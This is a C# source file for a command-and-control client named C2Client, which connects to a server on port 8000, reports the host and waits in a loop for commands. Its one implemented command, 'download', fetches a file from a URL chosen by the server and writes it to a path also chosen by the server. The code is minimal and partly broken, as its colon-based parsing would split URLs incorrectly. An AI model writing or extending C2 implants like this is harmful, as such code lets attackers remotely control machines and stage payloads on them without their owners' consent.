using System;
using System.Net;
using System.Net.Sockets;

namespace C2Client
{
    class Program
    {
        static void Main(string[] args)
        {

        // Set up the client
        string serverIp = "127.0.0.1";
        int serverPort = 8000;
        TcpClient client = new TcpClient(serverIp, serverPort);
        IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());



            // Get the client's stream
            NetworkStream stream = client.GetStream();

            // Send a request to the server

            string request = "Client Ping: " + host;
            byte[] requestBytes = System.Text.Encoding.ASCII.GetBytes(request);
            stream.Write(requestBytes, 0, requestBytes.Length);

            while (true)
            {
                // Read the server's response
                byte[] responseBuffer = new byte[1024];
                int bytesRead = stream.Read(responseBuffer, 0, 1024);
                string response = System.Text.Encoding.ASCII.GetString(responseBuffer, 0, bytesRead);


                    string[] output = response.Split(':');
                    // Print the server's response
                    string Command = "invalid";
                    string[] command1 = output[1].Split();
                    string[] command2 = output[2].Split();
                    string Command1 = command1[0];
                    string Command2 = command2[0].ToString();
                
                

                if (output[0] == "download")
                {

                    try
                    {


                        using (WebClient webClient = new WebClient())
                        {
                            webClient.DownloadFile(Command1, Command2);
                        }
                    } 
                    catch(Exception ex)                    
                    {
                        string errd = ex + " while trying to download!";
                        byte[] requestBytesERRD = System.Text.Encoding.ASCII.GetBytes(errd);
                        stream.Write(requestBytesERRD, 0, requestBytesERRD.Length);
                    }
                }

                

                Console.WriteLine("command Executed == ");

            }

            // Close the client's connection
            client.Close();
        }
    }
}